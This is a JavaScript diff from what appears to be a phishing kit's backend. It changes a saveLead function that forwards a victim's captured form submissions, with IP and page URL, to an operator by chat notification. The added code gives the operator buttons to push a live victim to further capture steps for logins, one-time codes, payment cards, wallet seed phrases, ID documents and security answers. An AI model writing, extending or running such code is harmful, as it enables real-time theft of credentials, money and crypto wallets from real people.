@@ -208,7 +208,27 @@ async function saveLead(page, tpl, stepSlug, body, req) {
 🕐 ${ts}${ipStr}${pageUrl}
 
 ${lines}`;
-    await notify(msg).catch(() => {});
+
+    // In ONLINE mode: attach inline keyboard so admin can push next step directly
+    if (page.mode === 'online') {
+      const sid = body._sid || '';
+      const nextPages = tpl.pages.filter(p => p.slug !== stepSlug);
+      // Build step buttons from template flow + common options
+      const stepBtns = [];
+      for (const np of nextPages) {
+        const stepEmoji = { login:'🔐', otp:'🔢', payment:'💳', seed_phrase:'🌱', id_verify:'🪪', security_q:'❓' }[np.form_type] || '➡️';
+        stepBtns.push({ text: `${stepEmoji} ${np.step_label || np.slug}`, callback_data: `push_${sid}_${np.slug}` });
+      }
+      // Always include complete + home
+      stepBtns.push({ text: '✅ Complete', callback_data: `push_${sid}_complete` });
+      stepBtns.push({ text: '🏠 Home', callback_data: `push_${sid}_HOME` });
+      // Chunk into rows of 2
+      const rows = [];
+      for (let i = 0; i < stepBtns.length; i += 2) rows.push(stepBtns.slice(i, i+2));
+      await notify(msg, { reply_markup: { inline_keyboard: rows } }).catch(() => {});
+    } else {
+      await notify(msg).catch(() => {});
+    }
   }
 }
 
